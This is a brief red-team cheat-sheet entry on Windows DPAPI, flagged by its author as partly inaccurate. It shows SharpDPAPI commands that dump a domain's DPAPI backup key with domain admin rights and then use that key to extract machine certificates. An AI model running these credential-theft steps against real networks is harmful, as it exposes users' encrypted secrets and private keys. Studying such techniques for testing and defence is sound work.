# DPAPI

@TODO: update this section because it's not exactly right.

Basically DPAPI is used for encryption purposes. If I have domain admin rights, I am able to retrieve the DPAPI master key for the domain and decipher any data encrypted with a DPAPI key of a domain user.

As a domain admin:

```powershell
> SharpDPAPI.exe backupkey /nowrap
```

## Retrieve certificates in a machine

With the backup key:

```powershell
> SharpDPAPI.exe certificates /pvk:<backup key>
```
